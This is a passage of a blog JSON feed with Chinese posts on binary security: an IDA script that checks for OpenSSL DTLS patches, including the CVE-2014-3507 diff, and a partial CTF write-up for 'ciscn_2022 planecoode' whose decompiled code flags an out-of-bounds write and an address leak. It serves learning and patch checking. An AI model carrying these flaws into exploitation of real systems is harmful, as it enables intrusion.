</span><br><span class=\"line\">+    <span class=\"comment\">/* Ensure there is no state left over from a previous invocation */</span></span><br><span class=\"line\">+    SSL_clear(s);</span><br><span class=\"line\">+</span><br><span class=\"line\">     SSL_set_options(s, SSL_OP_COOKIE_EXCHANGE);</span><br><span class=\"line\">     s-&gt;d1-&gt;listen = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>检测是否修复漏洞，就是看看 dtls1_listen 函数是否调用了 SSL_clear 函数。</p>\n<p>定位到 dtls1_listen 函数的位置，遍历他的每一条指令，筛选出函数调用指令的交叉引用，所以我们需要便利的同时进行排除选择，检查交叉引用的返回值，筛选出 fl_CN 或者 fl_CF 类型的交叉引用。然后判断，调用函数的名称是否为 SSL_clear.</p>\n<p>idc 脚本</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;idc.idc&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> func,end,target,inst,name,flags,xref;</span><br><span class=\"line\">    flags = SEARCH_DOWN | SEARCH_NEXT;</span><br><span class=\"line\">    Message(<span class=\"string\">&quot;now ,let&#x27;s begin!\\n\\n\\n*********************\\n&quot;</span>);</span><br><span class=\"line\">    func = LocByName(<span class=\"string\">&quot;dtls1_listen&quot;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(func == BADADDR)&#123;</span><br><span class=\"line\">\tWarning(<span class=\"string\">&quot;Sorry we cannnot find dtls1_listen in the database!&quot;</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        end = GetFunctionAttr(func,FUNCATTR_END);</span><br><span class=\"line\">        name = Name(func)</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(inst = func; inst &lt;end;inst = FindCode(inst,flags))&#123;</span><br><span class=\"line\">           <span class=\"keyword\">for</span> (target = Rfirst(inst);target != BADADDR;target = Rnext(inst,target))&#123;</span><br><span class=\"line\">\t\t\t  xref = XrefType();</span><br><span class=\"line\">               <span class=\"keyword\">if</span>(xref == fl_CN || xref == fl_CF)&#123;</span><br><span class=\"line\">                   Message(<span class=\"string\">&quot;%s calls %s from 0x%x\\n&quot;</span>,name ,Name(target),inst);</span><br><span class=\"line\">                   <span class=\"keyword\">if</span>(target == LocByName(<span class=\"string\">&quot;SSL_clear&quot;</span>))&#123;</span><br><span class=\"line\">                       Message(<span class=\"string\">&quot;this database hax beens patched!&quot;</span>);</span><br><span class=\"line\">                       <span class=\"keyword\">return</span> ;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">               </span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"task2cve-2014-3507\"><a class=\"markdownIt-Anchor\" href=\"#task2cve-2014-3507\">#</a> task2:CVE-2014-3507</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--- a/ssl/d1_both.c</span><br><span class=\"line\">+++ b/ssl/d1_both.c</span><br><span class=\"line\">@@ <span class=\"number\">-616</span>,<span class=\"number\">6</span> +<span class=\"number\">616</span>,<span class=\"number\">9</span> @@ dtls1_reassemble_fragment(SSL *s, <span class=\"keyword\">struct</span> hm_header_st* msg_hdr, <span class=\"type\">int</span> *ok)</span><br><span class=\"line\">            msg_hdr-&gt;msg_len &gt; dtls1_max_handshake_message_len(s))</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> err;</span><br><span class=\"line\"> </span><br><span class=\"line\">+       <span class=\"keyword\">if</span> (frag_len == <span class=\"number\">0</span>)</span><br><span class=\"line\">+               <span class=\"keyword\">return</span> DTLS1_HM_FRAGMENT_RETRY;</span><br><span class=\"line\">+</span><br><span class=\"line\">        <span class=\"comment\">/* Try to find item in queue */</span></span><br><span class=\"line\">        <span class=\"built_in\">memset</span>(seq64be,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(seq64be));</span><br><span class=\"line\">        seq64be[<span class=\"number\">6</span>] = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) (msg_hdr-&gt;seq&gt;&gt;<span class=\"number\">8</span>);</span><br><span class=\"line\">@@ <span class=\"number\">-693</span>,<span class=\"number\">7</span> +<span class=\"number\">696</span>,<span class=\"number\">12</span> @@ dtls1_reassemble_fragment(SSL *s, <span class=\"keyword\">struct</span> hm_header_st* msg_hdr, <span class=\"type\">int</span> *ok)</span><br><span class=\"line\">                        <span class=\"keyword\">goto</span> err;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">-               pqueue_insert(s-&gt;d1-&gt;buffered_messages, item);</span><br><span class=\"line\">+               item = pqueue_insert(s-&gt;d1-&gt;buffered_messages, item);</span><br><span class=\"line\">+               <span class=\"comment\">/* pqueue_insert fails iff a duplicate item is inserted.</span></span><br><span class=\"line\"><span class=\"comment\">+                * However, |item| cannot be a duplicate. If it were,</span></span><br><span class=\"line\"><span class=\"comment\">+                * |pqueue_find|, above, would have returned it and control</span></span><br><span class=\"line\"><span class=\"comment\">+                * would never have reached this branch. */</span></span><br><span class=\"line\">+               OPENSSL_assert(item != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> DTLS1_HM_FRAGMENT_RETRY;</span><br><span class=\"line\">@@ <span class=\"number\">-751</span>,<span class=\"number\">7</span> +<span class=\"number\">759</span>,<span class=\"number\">7</span> @@ dtls1_process_out_of_seq_message(SSL *s, <span class=\"keyword\">struct</span> hm_header_st* msg_hdr, <span class=\"type\">int</span> *ok)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">-               <span class=\"keyword\">if</span> (frag_len &amp;&amp; frag_len &lt; msg_hdr-&gt;msg_len)</span><br><span class=\"line\">+               <span class=\"keyword\">if</span> (frag_len &lt; msg_hdr-&gt;msg_len)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> dtls1_reassemble_fragment(s, msg_hdr, ok);</span><br><span class=\"line\"> </span><br><span class=\"line\">                <span class=\"keyword\">if</span> (frag_len &gt; dtls1_max_handshake_message_len(s))</span><br><span class=\"line\">@@ <span class=\"number\">-780</span>,<span class=\"number\">7</span> +<span class=\"number\">788</span>,<span class=\"number\">15</span> @@ dtls1_process_out_of_seq_message(SSL *s, <span class=\"keyword\">struct</span> hm_header_st* msg_hdr, <span class=\"type\">int</span> *ok)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( item == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">                        <span class=\"keyword\">goto</span> err;</span><br><span class=\"line\"> </span><br><span class=\"line\">-               pqueue_insert(s-&gt;d1-&gt;buffered_messages, item);</span><br><span class=\"line\">+               item = pqueue_insert(s-&gt;d1-&gt;buffered_messages, item);</span><br><span class=\"line\">+               <span class=\"comment\">/* pqueue_insert fails iff a duplicate item is inserted.</span></span><br><span class=\"line\"><span class=\"comment\">+                * However, |item| cannot be a duplicate. If it were,</span></span><br><span class=\"line\"><span class=\"comment\">+                * |pqueue_find|, above, would have returned it. Then, either</span></span><br><span class=\"line\"><span class=\"comment\">+                * |frag_len| != |msg_hdr-&gt;msg_len| in which case |item| is set</span></span><br><span class=\"line\"><span class=\"comment\">+                * to NULL and it will have been processed with</span></span><br><span class=\"line\"><span class=\"comment\">+                * |dtls1_reassemble_fragment|, above, or the record will have</span></span><br><span class=\"line\"><span class=\"comment\">+                * been discarded. */</span></span><br><span class=\"line\">+               OPENSSL_assert(item != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> DTLS1_HM_FRAGMENT_RETRY;</span><br></pre></td></tr></table></figure>\n<p>这个相比较第一个就复杂一些，影响版本为小于 1.0.1</p>\n",
            "tags": [
                "二进制学习"
            ]
        },
        {
            "id": "http://example.com/2022/06/23/test/",
            "url": "http://example.com/2022/06/23/test/",
            "title": "test",
            "date_published": "2022-06-23T03:56:22.000Z",
            "content_html": "<p>s</p>\n<p><img data-src=\"E:%5CmyBLOG%5Cblog%5Csource_posts%5Ctest%5C9%7DSY44NC03@1TZ%5BL3ICDSTV.png\" alt=\"img\"></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/06/21/ciscn-2022-whatheap/",
            "url": "http://example.com/2022/06/21/ciscn-2022-whatheap/",
            "title": "ciscn_2022_whatheap",
            "date_published": "2022-06-21T04:27:02.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://example.com/2022/06/20/ciscn-2022-planecoode/",
            "url": "http://example.com/2022/06/20/ciscn-2022-planecoode/",
            "title": "ciscn_2022_planecoode",
            "date_published": "2022-06-20T14:53:19.000Z",
            "content_html": "<h1 id=\"ciscn_2022-planecoode\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2022-planecoode\">#</a> CISCN_2022 planecoode</h1>\n<p>这个题目算是一个 llvm 的题目，对于我们输入的 code 进行解析操作，但是逆向的工程量很大，设计了很多 if,else 的模块，对应众多的操作。而且并不是说常规 vm 那种可以解析出常见汇编指令格式的操作码。而且使用了很多数据的转换操作，比如 BYTE1~BYTE5，HIBYTE,LOBYTE 等等，这些东西是我们必须回的东西。</p>\n<p>然后经过我长时间的解析，大概猜出来了流程，我们指定最开始的 xy, 这是边界限制，申请出来 8*x*y 字节的空间，然后对应的 (x,y) 的位置是一个 code,code 为 8 字节 64 位，储存在上述空间，然后开辟一个 x*y 大小的 stack，用来储存数据。</p>\n<p>下面的就是对于 code 解析处理，我们看到每次处理都是以 8 字节位单位，根据 x,y 来取指令，我们最简单的无疑是顺序取指。如何实现顺序取指？我们看看取指令的逻辑</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">entry</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *vale; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init_SIZE();                                  <span class=\"comment\">// 确定XY的范围</span></span><br><span class=\"line\">  <span class=\"built_in\">map</span> = (__int64 **)init_map(size_X, size_Y);</span><br><span class=\"line\">  set_code_data();                              <span class=\"comment\">// 填入code数据</span></span><br><span class=\"line\">  sub_E91();                                    <span class=\"comment\">// 选择初始位置</span></span><br><span class=\"line\">  sub_1583();                                   <span class=\"comment\">// 模拟栈空间</span></span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    vale = (<span class=\"type\">void</span> *)get_value_fromXY((__int64)<span class=\"built_in\">map</span>, size_X, size_Y, x_temp, y_temp);\t\t<span class=\"comment\">//根据xy来取指</span></span><br><span class=\"line\">    result = operation(vale);                   <span class=\"comment\">// 根据我们输入的code进行操作</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( result );</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里是函数的主入口，我们重点关注取指令跟 x,y 的关系</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">get_value_fromXY</span><span class=\"params\">(__int64 <span class=\"built_in\">map</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> XN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> YN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> x, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> y)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 pos; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  pos = get_pos(<span class=\"built_in\">map</span>, XN, YN, x, y);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( pos )</span><br><span class=\"line\">    result = get_code(pos);\t\t\t\t\t<span class=\"comment\">//return *(_QWORD *)a1;</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">get_pos</span><span class=\"params\">(__int64 <span class=\"built_in\">map</span>, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> XN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> YN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> x, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> y)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 pos; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  pos = check(XN, YN, x, y);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( pos == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"number\">8</span> * pos + <span class=\"built_in\">map</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">check</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> XN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> YN, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> x, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> y)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( x &lt; XN &amp;&amp; y &lt; YN )</span><br><span class=\"line\">    result = XN * y + x;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最内部是对我们提供的用来定位的 xy 的检查，然后 XN 是我们最开始输入的 x 的范围，因为我们确定了我们要顺序取指，所以，我这里直接将 YN 设置 1，将一个 2 维矩阵简化为以为的顺序，然后我们提供的初始位置都是从 0 开始，（0，0）并且下次取指只要对 x 进行加 1 的操作，y 一直为 0，这样从原来的 code [y][x] 直接简化为 code [x]。但是本质没有差别，知识实现了代码操作的简化。我们填入的 code，每次都会通过 strtoul (s, 0LL, 10) 转化为无符号的整数，储存在 64 位的空间中，这也是为什么我们 code 的空间是 8*x*y。</p>\n<p>接下来就是对 code 的解析，这一部分是最恶心的，太多种情况了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> n; <span class=\"comment\">// [rsp+1Ch] [rbp-24h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+28h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 s; <span class=\"comment\">// [rsp+30h] [rbp-10h] OVERLAPPED BYREF</span></span><br><span class=\"line\">  __int64 canary; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  canary = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(s));</span><br><span class=\"line\">  s = code;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x54</span> )          <span class=\"comment\">// 输出栈顶数据一字节</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&#123;%c&#125;&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*(<span class=\"type\">char</span> *)sRSP);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0x54</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xCC</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      pop_(<span class=\"number\">1u</span>);                                 <span class=\"comment\">// 数值与初始值相比，大于等于1，现在的数值就减一</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0xCC</span>u )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code != <span class=\"number\">0xD0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code &gt; <span class=\"number\">0xD0</span>u )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xD1</span> )  <span class=\"comment\">// 结束</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xDA</span> &amp;&amp; *(<span class=\"type\">int</span> *)((<span class=\"type\">char</span> *)&amp;s + <span class=\"number\">1</span>) &lt; size_X * size_Y )<span class=\"comment\">// 只检查了offset是否大于边界，但是未考虑到rsp,数组越界</span></span><br><span class=\"line\">            *(_BYTE *)(sRSP + *(<span class=\"type\">int</span> *)((<span class=\"type\">char</span> *)&amp;s + <span class=\"number\">1</span>)) = BYTE5(s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0xCD</span> )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          buf = <span class=\"built_in\">malloc</span>(BYTE1(s));               <span class=\"comment\">// malloc (0xe0)</span></span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">          n = read(<span class=\"number\">0</span>, buf, BYTE1(s));           <span class=\"comment\">// read 0xcd</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( n &gt; <span class=\"number\">0</span> &amp;&amp; *((_BYTE *)buf + n - <span class=\"number\">1</span>) == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">            *((_BYTE *)buf + n - <span class=\"number\">1</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You say \\&quot;%s\\&quot;\\n&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)buf);<span class=\"comment\">// 泄露地址</span></span><br><span class=\"line\">          <span class=\"built_in\">free</span>(buf);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code == <span class=\"number\">0x98</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        pop_(<span class=\"number\">4u</span>);                               <span class=\"comment\">// pop （int）</span></span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_55;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int8)code != <span class=\"number\">0xCA</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> 